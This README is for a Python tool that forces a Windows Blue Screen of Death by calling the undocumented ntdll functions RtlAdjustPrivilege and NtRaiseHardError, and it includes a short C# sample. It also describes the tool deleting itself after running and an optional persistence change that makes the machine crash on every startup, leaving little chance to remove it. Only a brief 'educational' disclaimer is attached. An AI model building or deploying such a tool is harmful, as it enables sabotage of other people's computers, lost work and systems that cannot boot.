# Windows BSOD made in python
This project was inspired from a undocumented function in ntdll.dll.
The function is based in C# but using ctypes python makes it possible  

[document](https://www.pinvoke.net/default.aspx/ntdll/NtRaiseHandError.html)  

Requires the SeShutdownPriviledge, otherwise will fail.
Use RtlAdjustPrivilege with Privilege parameter 19 to enable SeShutdownPriviledge.
```
C# Sample Code:
    Console.Write("Press any key to trigger a BSOD.");
    Console.ReadKey();
    RtlAdjustPrivilege(19, true, false, out bool previousValue);
    NtRaiseHardError(0xC0000420, 0, 0, IntPtr.Zero, 6, out uint Response);
```
Python version

- Supports compiling using pyinstaller and Nuitka
- Removes itself from execution directory automatically

# Restart prestance 
Modify Line 15:  

```executable = "BSOD.exe.malz"``` to ```"executable = "BSOD.exe"```  

*note this will cause it to BSOD on start up there is a very small window for deleting it*

# Disclaimer
This tool is intended for educational purposes and has been developed for troubleshooting the identification of BSOD (Blue Screen of Death) causes. Its usage for any illegal activities is strictly prohibited, as it is meant exclusively for educational purposes.
